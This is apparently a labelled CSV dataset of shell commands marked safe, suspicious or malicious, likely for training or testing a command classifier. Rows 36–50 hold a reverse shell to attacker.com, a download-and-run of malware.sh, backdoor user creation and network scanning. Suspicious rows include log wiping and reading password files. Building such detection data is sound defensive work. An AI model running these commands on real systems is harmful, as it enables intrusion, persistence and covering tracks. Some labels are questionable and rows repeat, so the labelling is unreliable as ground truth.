id,command,classification
1,find . -name '*.txt'; less file.txt,safe
2,man ls; help cd,safe
3,cd /tmp; nano example.txt,safe
4,cd /tmp; nano example.txt,safe
5,cd /tmp; nano example.txt,safe
6,echo 'hello'; whoami,safe
7,man ls; help cd,safe
8,man ls; help cd,safe
9,uptime; hostname; id,safe
10,ps aux; top,safe
11,uptime; hostname; id,safe
12,cd /home; ls -la; cat notes.txt,safe
13,df -h; free -m,safe
14,cd /home; ls -la; cat notes.txt,safe
15,mkdir test; cd test; touch file.txt,safe
16,find . -name '*.txt'; less file.txt,safe
17,cd /home; ls -la; cat notes.txt,safe
18,find . -name '*.txt'; less file.txt,safe
19,cd /tmp; nano example.txt,safe
20,cd /home; ls -la; cat notes.txt,safe
21,sudo su; passwd root,suspicious
22,ls /etc; cat passwd,suspicious
23,uname -a; dmesg | tail,suspicious
24,cat ~/.bash_history,suspicious
25,sudo su; passwd root,suspicious
26,uname -a; dmesg | tail,suspicious
27,ss -tulwn; ip a,suspicious
28,ls /etc; cat passwd,suspicious
29,sudo su; passwd root,suspicious
30,crontab -l; crontab -e,suspicious
31,rm -rf /var/log/*; history -c,suspicious
32,ss -tulwn; ip a,suspicious
33,ss -tulwn; ip a,suspicious
34,cat ~/.bash_history,suspicious
35,grep -i password *,suspicious
36,"""python -c 'import pty; pty.spawn(""""/bin/bash"""")'""",malicious
37,bash -i >& /dev/tcp/attacker.com/8080 0>&1,malicious
38,useradd hacker; echo 'hacker:1234' | chpasswd,malicious
39,echo 'hacked' > /root/hacked.txt,malicious
40,wget http://malicious.com/malware.sh; chmod +x malware.sh; ./malware.sh,malicious
41,dd if=/dev/sda of=/dev/null bs=1M,malicious
42,bash -i >& /dev/tcp/attacker.com/8080 0>&1,malicious
43,bash -i >& /dev/tcp/attacker.com/8080 0>&1,malicious
44,dd if=/dev/sda of=/dev/null bs=1M,malicious
45,wget http://malicious.com/malware.sh; chmod +x malware.sh; ./malware.sh,malicious
46,"""python -c 'import pty; pty.spawn(""""/bin/bash"""")'""",malicious
47,useradd hacker; echo 'hacker:1234' | chpasswd,malicious
48,nmap -sS -T4 192.168.0.1/24,malicious
49,echo 'hacked' > /root/hacked.txt,malicious
50,wget http://malicious.com/malware.sh; chmod +x malware.sh; ./malware.sh,malicious
51,ls -la; pwd; echo $PATH,safe
52,cat /etc/hostname; date,safe
53,"grep ""error"" /var/log/syslog",safe
54,du -sh /home/*; df -h,safe
55,"find / -type f -name ""config.php""",safe
56,vim ~/.bashrc; source ~/.bashrc,safe
57,tar -czf backup.tar.gz /home/user/docs,safe
58,ping -c 4 google.com; traceroute google.com,safe
59,journalctl -f; systemctl status apache2,safe
60,ifconfig; iwconfig; route -n,safe
61,htop; clear; ls -la,safe
62,cat /proc/cpuinfo; cat /proc/meminfo,safe
63,locate database.sql; which python,safe
64,chmod 644 *.txt; chown user:user *.txt,safe
65,ps -ef | grep mysql; netstat -tnlp,safe
66,sudo apt update; sudo apt upgrade -y,safe
67,mkdir -p ~/backups/$(date +%F),safe
68,ls -lah /var/log; tail -f /var/log/syslog,safe
69,"cd /etc; grep -r ""localhost"" .",safe
70,echo $USER; id; groups,safe
71,useradd -m testuser; passwd testuser,safe
72,git clone https://github.com/username/project.git,safe
73,rsync -avz /source/ /destination/,safe
74,curl -I https://example.com; wget -O index.html example.com,safe
75,"find /var/www -type f -name ""*.php""",safe
76,tail -100 /var/log/apache2/access.log,safe
77,sudo apt install tmux; tmux new -s mysession,safe
78,unzip archive.zip; tar -xf archive.tar,safe
79,less /etc/ssh/sshd_config; service ssh status,safe
80,"grep -v ""^#"" /etc/fstab; mount",safe
81,docker ps; docker images,safe
82,npm install express; node server.js,safe
83,pip install requests; python -V,safe
84,systemctl list-units --type=service,safe
85,lsblk; fdisk -l,safe
86,sed -i 's/old/new/g' file.txt,safe
87,awk '{print $1}' file.txt; sort file.txt | uniq,safe
88,cat /etc/os-release; uname -a,safe
89,lsof -i :80; netstat -tuln,safe
90,touch test{1..5}.txt; ls test*,safe
91,echo 'export PATH=$PATH:/usr/local/bin' >> ~/.bashrc,safe
92,ps aux --sort=-%mem | head -10,safe
93,scp localfile.txt user@remote:/path/,safe
94,cat /etc/hosts; hostname -I,safe
95,"mysql -u root -p -e ""SHOW DATABASES;""",safe
96,crontab -l; date; cal,safe
97,dig example.com; host example.com,safe
98,stat file.txt; file file.txt,safe
